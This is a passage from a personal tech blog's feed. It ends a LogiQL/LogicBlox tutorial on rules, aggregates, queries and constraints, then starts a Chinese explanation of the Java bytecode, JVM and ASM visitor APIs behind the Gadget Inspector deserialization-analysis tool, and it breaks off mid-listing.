class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">addblock <span class="string">&#x27;profit[icecream] =</span></span><br><span class="line"><span class="string">  price[icecream] - cost[icecream].</span></span><br><span class="line"><span class="string">  </span></span><br><span class="line"><span class="string">week_profit[icecream, week] =</span></span><br><span class="line"><span class="string">  profit[icecream] * week_sales[icecream, week].&#x27;</span></span><br></pre></td></tr></table></figure><p>然后打印规则，会自动进行计算：</p><figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">print profit</span><br><span class="line">print week_profit</span><br></pre></td></tr></table></figure><img src="https://i.loli.net/2021/10/26/VB3QW2kjvSnFNMG.png" width="80%"><h3 id="5-聚合函数（Aggregate）"><a href="#5-聚合函数（Aggregate）" class="headerlink" title="5. 聚合函数（Aggregate）"></a>5. 聚合函数（Aggregate）</h3><p>和 SQL 类似，LogiQL 中也有聚合函数。</p><p>定义 agg_profit 规则，使用 <code>total()</code> 聚合函数求和，将 profit 中所有事实的值 p 求和绑定到 value，其中 week 是聚合的周，使用通配符 <code>_</code> 忽略冰淇淋类型。表示总收益（收入-成本）。</p><p>agg_revenue 规则也是类似的定义，只不过把 p 换成了 r，表示总收入。</p><figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">agg_profit[week] = value &lt;-</span><br><span class="line">   agg&lt;&lt;value=total(p)&gt;&gt; week_profit[<span class="symbol">_</span>, week] = p.</span><br><span class="line"> </span><br><span class="line">agg_revenue[week] = value &lt;-</span><br><span class="line">   agg&lt;&lt;value=total(r)&gt;&gt; week_revenue[<span class="symbol">_</span>, week] = r.</span><br></pre></td></tr></table></figure><p>使用 <code>addblock</code> 添加规则：</p><figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">addblock <span class="string">&#x27;agg_profit[week] = value &lt;-</span></span><br><span class="line"><span class="string">    agg&lt;&lt;value=total(p)&gt;&gt; week_profit[_, week] = p.</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">agg_revenue[week] = value &lt;-</span></span><br><span class="line"><span class="string">   agg&lt;&lt;value=total(r)&gt;&gt; week_revenue[_, week] = r.&#x27;</span></span><br></pre></td></tr></table></figure><p>打印规则，得到聚合的结果：</p><figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">print agg_profit</span><br><span class="line">print agg_revenue</span><br></pre></td></tr></table></figure><img src="https://i.loli.net/2021/10/26/itCR34j9Fl5PGkI.png" width="85%"><p>定义一个没有键的规则计算 price 谓词中的事实（条目）数量，即冰淇淋类型的数量：</p><figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">addblock <span class="string">&#x27;icecream_count[] = value &lt;-</span></span><br><span class="line"><span class="string">    agg&lt;&lt;value=count()&gt;&gt; price[_] = _.&#x27;</span></span><br></pre></td></tr></table></figure><p>打印规则，得到冰淇淋类型的数量：</p><figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">print icecream_count</span><br></pre></td></tr></table></figure><img src="https://i.loli.net/2021/10/26/zhCBUYFmRMZawT1.png" width="80%"><h3 id="6-查询（query）"><a href="#6-查询（query）" class="headerlink" title="6. 查询（query）"></a>6. 查询（query）</h3><p>之前使用 print 查看谓词和规则的值，现在可以用 query 执行更高级的查询。</p><p>定义一个谓词 <code>_</code> 用事实填充，通常使用规则实现。</p><p>下面的查询与 <code>print week_sales</code> 拥有等价的结果。这里不使用功能谓词语法 <code>predicate[k1, k2] = v</code>，而是使用 <code>predicate(k1, k2, k3)</code>，因为这里对键值不感兴趣，只对事实感兴趣。</p><figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">query <span class="string">&#x27;_(icecream, week, value) &lt;-</span></span><br><span class="line"><span class="string">  week_sales[icecream, week] = value.&#x27;</span></span><br></pre></td></tr></table></figure><img src="https://i.loli.net/2021/10/26/iXhUMutwd63Sxfz.png" width="95%"><p>检索 week_sales 谓词中使用的所有冰淇淋，尽管 week_sales 谓词多次包含这些值中的每一个，但每个不同值只返回一次（有 1、2 两周的数据，所以冰淇淋重复出现）</p><ul><li>在 LogiQL 中所有谓词都是集合：每一行只能出现一次</li></ul><figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">query <span class="string">&#x27;_(icecream) &lt;- week_sales[icecream, _] = _.&#x27;</span></span><br></pre></td></tr></table></figure><p>将冰淇淋和每周的销售额、收入、收益整合在一起，就像 SQL 中的 JOIN 操作：</p><figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">query <span class="string">&#x27;_(icecream, week, sales, revenue, profit) &lt;-</span></span><br><span class="line"><span class="string">  week_sales[icecream, week] = sales,</span></span><br><span class="line"><span class="string">  week_revenue[icecream, week] = revenue,</span></span><br><span class="line"><span class="string">  week_profit[icecream, week] = profit.&#x27;</span></span><br></pre></td></tr></table></figure><img src="https://i.loli.net/2021/10/26/6QKeRXIA9wf3c4j.png" width="80%"><h3 id="7-约束（constraint）"><a href="#7-约束（constraint）" class="headerlink" title="7. 约束（constraint）"></a>7. 约束（constraint）</h3><p>降低冰淇淋的售价，再次查询发现冰淇淋的收益变成了负数：</p><figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">exec <span class="string">&#x27;^price[&quot;Popsicle Lemon&quot;] = 20.&#x27;</span></span><br><span class="line">query <span class="string">&#x27;_(profit) &lt;- profit[&quot;Popsicle Lemon&quot;] = profit.&#x27;</span></span><br></pre></td></tr></table></figure><img src="https://i.loli.net/2021/10/26/UwXr3PaOCH7bV4G.png" width="80%"><p>定义一个约束：对于 profit 谓词中的每个事实，value 应该大于等于 0。</p><figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">profit[<span class="symbol">_</span>] = value -&gt; value &gt;= <span class="number">0.</span></span><br></pre></td></tr></table></figure><p>使用 <code>addblock</code> 添加约束，因为 profit 谓词中有事实的 value 值小于 0，所以添加约束失败。</p><figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">addblock <span class="string">&#x27;profit[_] = value -&gt; value &gt;= 0.&#x27;</span></span><br></pre></td></tr></table></figure><p>修改冰淇淋售价后再添加约束：</p><figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">exec <span class="string">&#x27;^price[&quot;Popsicle Lemon&quot;] = 40.&#x27;</span></span><br><span class="line">addblock <span class="string">&#x27;profit[_] = value -&gt; value &gt;= 0.&#x27;</span></span><br></pre></td></tr></table></figure><p>再次修改冰淇淋售价，返回约束错误：</p><figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exec <span class="string">&#x27;^price[&quot;Popsicle Lemon&quot;] = 10.&#x27;</span></span><br></pre></td></tr></table></figure><img src="https://i.loli.net/2021/10/26/9TnycWQ4ZeBCJob.png"><h1 id="0x02-结语"><a href="#0x02-结语" class="headerlink" title="0x02 结语"></a>0x02 结语</h1><p>有一说一，这个入门完全不足以让人看懂 <a href="https://bitbucket.org/yanniss/doop/src/master/lb-logic/">doop/lb-logic</a> 里面的规则，做都做了就理上来了XD</p><p>补充：本地可以使用 <a href="http://snf-705535.vm.okeanos.grnet.gr/agreement.html">PA-Datalog</a> 引擎，是 LogicBlox v3 的改良版本，可用于程序分析。</p>]]></content>
    
    
    <summary type="html">30 分钟 LogicBlox REPL 教程</summary>
    
    
    
    <category term="Other" scheme="https://jckling.github.io/categories/Other/"/>
    
    
    <category term="Datalog" scheme="https://jckling.github.io/tags/Datalog/"/>
    
  </entry>
  
  <entry>
    <title>Gadget Inspector 源码解析</title>
    <link href="https://jckling.github.io/2021/10/12/Security/Gadget%20Inspector%20%E6%BA%90%E7%A0%81%E8%A7%A3%E6%9E%90/"/>
    <id>https://jckling.github.io/2021/10/12/Security/Gadget%20Inspector%20%E6%BA%90%E7%A0%81%E8%A7%A3%E6%9E%90/</id>
    <published>2021-10-12T03:41:30.000Z</published>
    <updated>2021-11-23T07:11:29.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>Netflix 工程师开发的 Gadget Inspector 是一个用于挖掘 Java 反序列化漏洞利用链的工具，网上有两个同名资料 Automated Discovery of Deserialization Gadget Chains：<a href="https://i.blackhat.com/us-18/Thu-August-9/us-18-Haken-Automated-Discovery-of-Deserialization-Gadget-Chains-wp.pdf">论文</a>、<a href="https://i.blackhat.com/us-18/Thu-August-9/us-18-Haken-Automated-Discovery-of-Deserialization-Gadget-Chains.pdf">PPT</a>。看懂工作流程并不难，入口类非常清晰明了，主要是逆拓扑排序、JVM 模拟（本地变量表、操作数栈）的部分比较晦涩。鉴于我四舍五入算是零基础接触 Java，所以前面先补充一些相关知识，后面再详细解析 Gadget Inspector 的代码。</p><p>加了注释的源码：<a href="https://github.com/jckling/gadgetinspector">jckling/gadgetinspector</a></p><h1 id="0x01-预备知识"><a href="#0x01-预备知识" class="headerlink" title="0x01 预备知识"></a>0x01 预备知识</h1><h2 id="1-1-Java-字节码"><a href="#1-1-Java-字节码" class="headerlink" title="1.1 Java 字节码"></a>1.1 Java 字节码</h2><p>看美团的 <a href="https://tech.meituan.com/2019/09/05/java-bytecode-enhancement.html">字节码增强技术探索</a> 里面的介绍就够了，内容包括 java 的字节码、asm 框架、Javassist 框架以及 instrument 类库。</p><p><strong>限定名（qualified names）</strong>：名称、<code>.</code>、标识符，例如：demo.servlet.HelloServlet，有些地方用 <code>/</code> 代替点号</p><p><strong>简单名称（simple name）</strong>：单个标识符，例如：test</p><p><strong>完全限定名（fully qualified names）</strong>：每个原始类型、命名包、顶级类和顶级接口都有一个完全限定名，有的是简单名称有的是限定名，详见 <a href="https://docs.oracle.com/javase/specs/jls/se17/html/jls-6.html#jls-6.7">6.7. Fully Qualified Names and Canonical Names</a></p><p><strong>描述符（Descriptor）</strong></p><ol><li><p>字段（Field）描述符</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">FieldDescriptor:</span><br><span class="line">FieldType</span><br><span class="line"></span><br><span class="line">FieldType:</span><br><span class="line">    BaseType</span><br><span class="line">    ObjectType</span><br><span class="line">    ArrayType</span><br><span class="line">   </span><br><span class="line">BaseType:</span><br><span class="line">    B</span><br><span class="line">    C</span><br><span class="line">    D</span><br><span class="line">    F</span><br><span class="line">    I</span><br><span class="line">    J</span><br><span class="line">    S</span><br><span class="line">    Z</span><br><span class="line">   </span><br><span class="line">ObjectType:</span><br><span class="line">    L ClassName ;</span><br><span class="line"></span><br><span class="line">ArrayType:</span><br><span class="line">    [ ComponentType</span><br><span class="line"></span><br><span class="line">ComponentType:</span><br><span class="line">    FieldType</span><br></pre></td></tr></table></figure><p> 说明</p><table><thead><tr><th>BaseType Character</th><th>Type</th><th>Interpretation</th></tr></thead><tbody><tr><td>B</td><td>byte</td><td>signed byte</td></tr><tr><td>C</td><td>char</td><td>Unicode character code point in the Basic Multilingual Plane,     encoded with UTF-16</td></tr><tr><td>D</td><td>double</td><td>double-precision floating-point value</td></tr><tr><td>F</td><td>float</td><td>single-precision floating-point value</td></tr><tr><td>I</td><td>int</td><td>integer</td></tr><tr><td>J</td><td>long</td><td>long integer</td></tr><tr><td>L</td><td>ClassName</td><td>;    reference    an instance of class ClassName</td></tr><tr><td>S</td><td>short</td><td>signed short</td></tr><tr><td>Z</td><td>boolean</td><td>true or false</td></tr><tr><td>[</td><td>reference</td><td>one array dimension</td></tr></tbody></table></li><li><p>方法（Method）描述符</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">MethodDescriptor:</span><br><span class="line">    ( ParameterDescriptor* ) ReturnDescriptor</span><br><span class="line"></span><br><span class="line">ParameterDescriptor:</span><br><span class="line">    FieldType</span><br><span class="line"></span><br><span class="line">ReturnDescriptor:</span><br><span class="line">    FieldType</span><br><span class="line">    VoidDescriptor</span><br><span class="line"></span><br><span class="line">VoidDescriptor:</span><br><span class="line">    V</span><br></pre></td></tr></table></figure></li></ol><h2 id="1-2-JVM"><a href="#1-2-JVM" class="headerlink" title="1.2 JVM"></a>1.2 JVM</h2><p>Gadget Inspector 的 <code>TaintTrackingMethodVisitor</code> 中模拟了 JVM 的本地变量表（Local Variable Table）和操作数栈（Operand Stack），用于进行污点分析。</p><p><strong>栈帧（Stack Frame）</strong> 是用于支持虚拟机进行方法调用和方法执行的数据结构，每个方法从调用到执行完成的过程，都对应着一个栈帧在虚拟机栈里从入栈到出栈的过程。</p><p><strong>本地变量表（Local Variable Table）</strong> 存储了方法参数和方法内定义的局部变量，隐式传入实例对象本身 <code>this</code> 。</p><p><strong>操作数栈（Operand Stack）</strong> 由操作码控制元素的出/入栈，操作数栈中的元素可以是任意 Java 数据类型。</p><ul><li>入栈：本地变量表或对象实例的字段中的元素（常量/变量）</li><li>出栈：将栈中元素写入本地变量表或返回给方法调用者（返回栈顶）</li><li>栈中元素的长度可能为 0、1、2，这里一个单位为 32 位</li></ul><h2 id="1-3-ASM"><a href="#1-3-ASM" class="headerlink" title="1.3 ASM"></a>1.3 ASM</h2><h3 id="访问者模式"><a href="#访问者模式" class="headerlink" title="访问者模式"></a>访问者模式</h3><p>访问者模式的核心思想是为了访问比较复杂的数据结构，不去改变数据结构，而是把对数据的操作抽象出来，<strong>在“访问”的过程中以回调形式在访问者中处理操作逻辑</strong>。如果要新增一组操作，那么只需要增加一个新的访问者。</p><h3 id="代码组织架构"><a href="#代码组织架构" class="headerlink" title="代码组织架构"></a>代码组织架构</h3><img src="https://i.loli.net/2021/10/14/KQyh94RWalubxLd.png" width="90%"><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">org.objectweb.asm<span class="comment"># Core API，核心包</span></span><br><span class="line">org.objectweb.asm.commons<span class="comment"># 基于 core 和 tree 的类适配器</span></span><br><span class="line">org.objectweb.asm.signature<span class="comment"># 泛型定义的相关操作 API，核心包的扩充</span></span><br><span class="line">org.objectweb.asm.tree<span class="comment"># Tree API，实现复杂的类转换</span></span><br><span class="line">org.objectweb.asm.tree.analysis        <span class="comment"># 基于 tree 包提供的静态字节码分析框架</span></span><br><span class="line">org.objectweb.asm.util<span class="comment"># 用于调试的类访问器和适配器</span></span><br><span class="line">org.objectweb.asm.xml<span class="comment"># 弃用</span></span><br></pre></td></tr></table></figure><h3 id="工作流程"><a href="#工作流程" class="headerlink" title="工作流程"></a>工作流程</h3><ol><li><p><code>ClassReader</code> 类解析 class 文件（事件生成）</p><ul><li>调用作为参数传递给 accept 方法的 <code>ClassVisitor</code> 实例上相应的 visitXxx 方法</li></ul></li><li><p><code>ClassVisitor</code> 类将所有方法调用委派给另一个 <code>ClassVisitor</code> 实例（事件过滤）</p></li><li><p><code>ClassWriter</code> 类是 <code>ClassVisitor</code> 抽象类的子类（事件消费）</p></li></ol><p>为了对类文件进行“观察”，需要继承和重写访问者（Visitor），然后调用 ClassReader.accept 方法执行访问，该方法将按顺序调用参数 ClassVisitor 中的方法，没有重写的则调用父类 ClassVisitor 默认的方法；观察到方法时，将按顺序调用 MethodVisitor 中的方法，没有重写的也调用默认方法。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 构造函数</span></span><br><span class="line"><span class="comment"> * 构造一个新的 ClassReader 对象</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> classFile 要读取的 JVMS ClassFile 结构</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> ClassReader​(<span class="keyword">byte</span>[] classFile)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 用给定的访问者访问传递给此 ClassReader 的构造函数的 JVMS ClassFile 结构</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> classVisitor    访问者</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> parsingOptions  用于解析此类的选项（SKIP_CODE, SKIP_DEBUG, SKIP_FRAMES, EXPAND_FRAMES）</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> accept​(ClassVisitor classVisitor, <span class="keyword">int</span> parsingOptions)</span><br></pre></td></tr></table></figure><img src="https://i.loli.net/2021/10/14/rAEhSn8x3DMLwtO.jpg"><h3 id="访问者"><a href="#访问者" class="headerlink" title="访问者"></a>访问者</h3><h4 id="1-ClassVisitor"><a href="#1-ClassVisitor" class="headerlink" title="1. ClassVisitor"></a>1. ClassVisitor</h4><p>方法调用顺序（访问顺序）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">visit [ visitSource ] [ visitModule ][ visitNestHost ][ visitOuterClass ] ( visitAnnotation | visitTypeAnnotation | visitAttribute )* ( visitNestMember | [ * visitPermittedSubclass ] | visitInnerClass | visitRecordComponent | visitField | visitMethod )* visitEnd</span><br></pre></td></tr></table></figure><p>Gadget Inspector 中涉及的方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 构造函数</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span>api     访问者实现的 ASM API 版本。必须是 Opcodes.ASM4、Opcodes.ASM5、Opcodes.ASM6、Opcodes.ASM7 之一。</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> ClassVisitor​(<span class="keyword">int</span> api)</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 访问类的头部</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span>version类版本</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span>access类的访问标志（Opcodes）</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span>name类的内部名称（完全限定名）</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span>signature类的签名</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span>superName父类的内部名称</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span>interfaces类接口的内部名称</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">visit</span><span class="params">(<span class="keyword">int</span> version, <span class="keyword">int</span> access, java.lang.String name, java.lang.String signature, java.lang.String superName, java.lang.String[] interfaces)</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="comment">/**</span></span></span><br><span class="line"><span class="function"><span class="comment"> * 访问类的外围类，当类具有外围类时自动调用此方法</span></span></span><br><span class="line"><span class="function"><span class="comment"> *</span></span></span><br><span class="line"><span class="function"><span class="comment"> * @paramowner类的外围类的内部名称</span></span></span><br><span class="line"><span class="function"><span class="comment"> * @paramname包含类的方法的名称，如果类没有包含在其外围类的方法中，则为空</span></span></span><br><span class="line"><span class="function"><span class="comment"> * @paramdescriptor包含类的方法的描述符，如果类没有包含在其外围类的方法中，则为空</span></span></span><br><span class="line"><span class="function"><span class="comment"> * @return</span></span></span><br><span class="line"><span class="function"><span class="comment"> */</span></span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">visitOuterClass</span><span class="params">(java.lang.String owner, java.lang.String name, java.lang.String descriptor)</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="comment">/**</span></span></span><br><span class="line"><span class="function"><span class="comment"> * 访问内部类，这个内部类不一定是被访问的类的成员</span></span></span><br><span class="line"><span class="function"><span class="comment"> *</span></span></span><br><span class="line"><span class="function"><span class="comment"> * @paramowner内部类的内部名称</span></span></span><br><span class="line"><span class="function"><span class="comment"> * @paramouterName内部类所属的类的内部名称，对于非成员类可能为空</span></span></span><br><span class="line"><span class="function"><span class="comment"> * @paraminnerName内部类在其外围类中的(简单)名称，对于匿名内部类可能为空</span></span></span><br><span class="line"><span class="function"><span class="comment"> * @paramaccess内部类最初在外围类中声明的访问标志</span></span></span><br><span class="line"><span class="function"><span class="comment"> * @return</span></span></span><br><span class="line"><span class="function"><span class="comment"> */</span></span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">visitInnerClass</span><span class="params">(java.lang.String name, java.lang.String outerName, java.lang.String innerName, <span class="keyword">int</span> access)</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="comment">/**</span></span></span><br><span class="line"><span class="function"><span class="comment"> * 访问类的字段</span></span></span><br><span class="line"><span class="function"><span class="comment"> *</span></span></span><br><span class="line"><span class="function"><span class="comment"> * @paramaccess字段的访问标志</span></span></span><br><span class="line"><span class="function"><span class="comment"> * @paramname    字段的名称</span></span></span><br><span class="line"><span class="function"><span class="comment"> * @paramdescriptor字段的描述符</span></span></span><br><span class="line"><span class="function"><span class="comment"> * @paramsignature字段的签名</span></span></span><br><span class="line"><span class="function"><span class="comment"> * @paramvalue       字段的初始值，仅针对静态字段</span></span></span><br><span class="line"><span class="function"><span class="comment"> * @return</span></span></span><br><span class="line"><span class="function"><span class="comment"> */</span></span></span><br><span class="line"><span class="function"><span class="keyword">public</span> FieldVisitor visitField​<span class="params">(<span class="keyword">int</span> access, java.lang.String name, java.lang.String descriptor, java.lang.String signature, java.lang.Object value)</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="comment">/**</span></span></span><br><span class="line"><span class="function"><span class="comment"> * 访问类的一个方法（方法定义）</span></span></span><br><span class="line"><span class="function"><span class="comment"> * 这个方法在每次调用时必须返回一个新的 MethodVisitor 实例（或null）</span></span></span><br><span class="line"><span class="function"><span class="comment"> *</span></span></span><br><span class="line"><span class="function"><span class="comment"> * @paramaccess方法的访问标志（Opcodes）</span></span></span><br><span class="line"><span class="function"><span class="comment"> * @paramname方法的名称</span></span></span><br><span class="line"><span class="function"><span class="comment"> * @paramdescriptor方法的描述符</span></span></span><br><span class="line"><span class="function"><span class="comment"> * @paramsignature方法的签名，如果方法参数、返回类型和异常不使用泛型类型，则可能为空</span></span></span><br><span class="line"><span class="function"><span class="comment"> * @paramexceptions方法异常类的内部名称，可能为空</span></span></span><br><span class="line"><span class="function"><span class="comment"> * @return</span></span></span><br><span class="line"><span class="function"><span class="comment"> */</span></span></span><br><span class="line"><span class="function"><span class="keyword">public</span> MethodVisitor <span class="title">visitMethod</span><span class="params">(<span class="keyword">int</span> access, java.lang.String name, java.lang.String descriptor, java.lang.String signature, java.lang.String[] exceptions)</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="comment">/**</span></span></span><br><span class="line"><span class="function"><span class="comment"> * 该方法是最后一个被调用的方法，用于通知访问者该类的所有字段和方法已被访问</span></span></span><br><span class="line"><span class="function"><span class="comment"> */</span></span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">visitEnd</span><span class="params">()</span></span></span><br></pre></td></tr></table></figure><h4 id="2-MethodVisitor"><a href="#2-MethodVisitor" class="headerlink" title="2. MethodVisitor"></a>2. MethodVisitor</h4><p>方法调用顺序（访问顺序），<code>visit&lt;i&gt;X&lt;/i&gt;Insn</code> 按照字节码指令顺序调用。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">( visitParameter )* [ visitAnnotationDefault ] ( visitAnnotation | visitAnnotableParameterCount | visitParameterAnnotation visitTypeAnnotation | visitAttribute )* [ visitCode ( visitFrame | visit&lt;i&gt;X&lt;&#x2F;i&gt;Insn | visitLabel | visitInsnAnnotation | visitTryCatchBlock | visitTryCatchAnnotation | visitLocalVariable | visitLocalVariableAnnotation | visitLineNumber )* visitMaxs ] visitEnd</span><br><span class="line"></span><br><span class="line">In addition, the visit&lt;i&gt;X&lt;&#x2F;i&gt;Insn and visitLabel methods must be called in the sequential order of the bytecode instructions of the visited code.</span><br></pre></td></tr></table></figure><p>Gadget Inspector 中涉及的方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span 